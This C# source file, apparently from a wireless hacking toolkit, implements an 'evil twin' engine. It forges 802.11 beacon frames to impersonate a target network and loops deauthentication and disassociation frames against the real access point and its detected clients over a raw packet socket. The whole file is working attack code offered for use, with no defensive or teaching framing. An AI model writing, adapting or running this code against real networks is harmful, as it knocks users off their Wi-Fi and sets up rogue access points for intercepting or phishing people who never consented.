using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;

namespace HackItWireless
{
    public class EviltwinEngineV1
    {
        private readonly string _iface;
        private byte[] _bssid;
        private byte[] _realBssid;
        private bool _realBssidSet;
        private readonly string _ssid;
        private readonly int _channel;
        private volatile bool _running;
        private volatile bool _deauthRunning;
        private long _sent;
        private long _deauthSent;
        private Thread _beaconWorker;
        private Thread _deauthWorker;
        private readonly List<string> _detectedClients = new List<string>();
        private readonly object _clientsLock = new object();

        /* Pre-built deauth/disassoc frames */
        private byte[] _deauthFrame;
        private byte[] _disassocFrame;

        private static readonly byte[] Radiotap = {
            0x00, 0x00, 0x14, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };

        private static readonly byte[] SupportedRates = {
            0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
        };

        public EviltwinEngineV1(string iface, string ssid, string bssid, int channel)
        {
            _iface = iface;
            _ssid = ssid;
            _bssid = ParseMac(bssid);
            _channel = channel;
        }

        public long Sent => Interlocked.Read(ref _sent);
        public long DeauthSent => Interlocked.Read(ref _deauthSent);
        public List<string> GetClients() { lock (_clientsLock) return new List<string>(_detectedClients); }

        public void SetRealBssid(string bssid)
        {
            _realBssid = ParseMac(bssid);
            _realBssidSet = true;
            byte[] broadcast = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
            _deauthFrame = BuildDeauthFrame(0xC0, _realBssid, broadcast);
            _disassocFrame = BuildDeauthFrame(0xA0, _realBssid, broadcast);
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            _beaconWorker = new Thread(BeaconLoop) { IsBackground = true };
            _beaconWorker.Start();
        }

        public void Stop()
        {
            _running = false;
            _deauthRunning = false;
            _beaconWorker?.Join(2000);
            _deauthWorker?.Join(2000);
        }

        public void StartDeauth()
        {
            if (!_realBssidSet || _deauthRunning) return;
            _deauthRunning = true;
            _deauthWorker = new Thread(DeauthLoop) { IsBackground = true };
            _deauthWorker.Start();
        }

        public void StopDeauth()
        {
            _deauthRunning = false;
            _deauthWorker?.Join(2000);
        }

        private byte[] BuildBeaconFrame(byte[] bssid, string ssid, int channel, uint seq)
        {
            byte[] ssidBytes = System.Text.Encoding.ASCII.GetBytes(ssid);
            int bodyLen = 8 + 2 + 2 + 2 + ssidBytes.Length + 2 + SupportedRates.Length + 2 + 1;
            byte[] body = new byte[bodyLen];
            int off = 0;

            off += 8;
            body[off++] = 0x64;
            body[off++] = 0x00;
            body[off++] = 0x21;
            body[off++] = 0x00;
            body[off++] = 0x00;
            body[off++] = (byte)ssidBytes.Length;
            Buffer.BlockCopy(ssidBytes, 0, body, off, ssidBytes.Length);
            off += ssidBytes.Length;
            body[off++] = 0x01;
            body[off++] = (byte)SupportedRates.Length;
            Buffer.BlockCopy(SupportedRates, 0, body, off, SupportedRates.Length);
            off += SupportedRates.Length;
            body[off++] = 0x03;
            body[off++] = 0x01;
            body[off] = (byte)channel;

            byte[] hdr = new byte[24];
            hdr[0] = 0x80;
            hdr[1] = 0x00;
            for (int i = 0; i < 6; i++) hdr[4 + i] = 0xFF;
            Buffer.BlockCopy(bssid, 0, hdr, 10, 6);
            Buffer.BlockCopy(bssid, 0, hdr, 16, 6);
            ushort encSeq = (ushort)((seq << 4) & 0xFFFF);
            hdr[22] = (byte)(encSeq & 0xFF);
            hdr[23] = (byte)((encSeq >> 8) & 0xFF);

            byte[] frame = new byte[Radiotap.Length + hdr.Length + body.Length];
            Buffer.BlockCopy(Radiotap, 0, frame, 0, Radiotap.Length);
            long ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1000L;
            Buffer.BlockCopy(BitConverter.GetBytes(ts), 0, frame, 8, 8);
            Buffer.BlockCopy(hdr, 0, frame, Radiotap.Length, hdr.Length);
            Buffer.BlockCopy(body, 0, frame, Radiotap.Length + hdr.Length, body.Length);
            return frame;
        }

        private byte[] BuildDeauthFrame(byte frameType, byte[] bssid, byte[] station)
        {
            byte[] frame = new byte[Radiotap.Length + 24];
            Buffer.BlockCopy(Radiotap, 0, frame, 0, Radiotap.Length);
            int off = Radiotap.Length;
            frame[off++] = frameType; frame[off++] = 0x00;
            frame[off++] = 0x3A; frame[off++] = 0x01;
            Buffer.BlockCopy(station, 0, frame, off, 6); off += 6;
            Buffer.BlockCopy(bssid, 0, frame, off, 6); off += 6;
            Buffer.BlockCopy(bssid, 0, frame, off, 6); off += 6;
            frame[off++] = 0x00; frame[off++] = 0x00;
            frame[off++] = 0x03; frame[off++] = 0x00;
            return frame;
        }

        private void BeaconLoop()
        {
            int fd = RawSocketOpen(_iface);
            if (fd < 0) { _running = false; return; }
            uint seq = 0;
            try
            {
                while (_running)
                {
                    for (int i = 0; i < 64 && _running; i++)
                    {
                        byte[] f = BuildBeaconFrame(_bssid, _ssid, _channel, seq++);
                        if (RawSocketSend(fd, f) > 0)
                            Interlocked.Increment(ref _sent);
                    }
                }
            }
            catch { }
            finally { RawSocketClose(fd); }
        }

        private void DeauthLoop()
        {
            int fd = RawSocketOpen(_iface);
            if (fd < 0) { _deauthRunning = false; return; }
            long total = 0;
            try
            {
                while (_deauthRunning)
                {
                    RawSocketSend(fd, _deauthFrame); total++;
                    RawSocketSend(fd, _disassocFrame); total++;

                    lock (_clientsLock)
                    {
                        if (_detectedClients.Count > 0)
                        {
                            int idx = (int)(total % _detectedClients.Count);
                            string mac = _detectedClients[idx];
                            byte[] clientMac = ParseMac(mac);
                            byte[] frame = BuildDeauthFrame(0xC0, _realBssid, clientMac);
                            RawSocketSend(fd, frame); total++;
                            frame = BuildDeauthFrame(0xC0, clientMac, _realBssid);
                            RawSocketSend(fd, frame); total++;
                        }
                    }
                }
            }
            catch { }
            finally
            {
                Interlocked.Add(ref _deauthSent, total);
                RawSocketClose(fd);
            }
        }

        private static int RawSocketOpen(string iface)
        {
            byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(iface + "\0");
            uint ifindex = if_nametoindex(ifaceBytes);
            if (ifindex == 0) return -1;
            int fd = socket(AF_PACKET, SOCK_RAW, (ETH_P_ALL << 8) | ETH_P_ALL);
            if (fd < 0) return -1;
            SockAddrLl addr = new SockAddrLl
            {
                sll_family = AF_PACKET, sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
                sll_ifindex = (int)ifindex, sll_hatype = 0, sll_pkttype = 0, sll_halen = 0,
                sll_addr = new byte[8]
            };
            int r = bind(fd, ref addr, Marshal.SizeOf(addr));
            if (r < 0) { close(fd); return -1; }
            return fd;
        }

        private static int RawSocketSend(int fd, byte[] buf) => send(fd, buf, buf.Length, 0);
        private static void RawSocketClose(int fd) { if (fd >= 0) close(fd); }

        private static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12) throw new ArgumentException($"Invalid MAC: {mac}");
            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++) bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);
            return bytes;
        }

        private const int AF_PACKET = 17, SOCK_RAW = 3, ETH_P_ALL = 0x0003;

        [DllImport("libc", SetLastError = true)] private static extern int socket(int domain, int type, int protocol);
        [DllImport("libc", SetLastError = true)] private static extern int bind(int sockfd, ref SockAddrLl addr, int addrlen);
        [DllImport("libc", SetLastError = true)] private static extern int send(int sockfd, byte[] buf, int len, int flags);
        [DllImport("libc", SetLastError = true)] private static extern int close(int fd);
        [DllImport("libc", SetLastError = true)] private static extern uint if_nametoindex([In] byte[] ifname);

        private struct SockAddrLl
        {
            public ushort sll_family; public ushort sll_protocol; public int sll_ifindex;
            public ushort sll_hatype; public byte sll_pkttype; public byte sll_halen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] sll_addr;
        }
    }
}
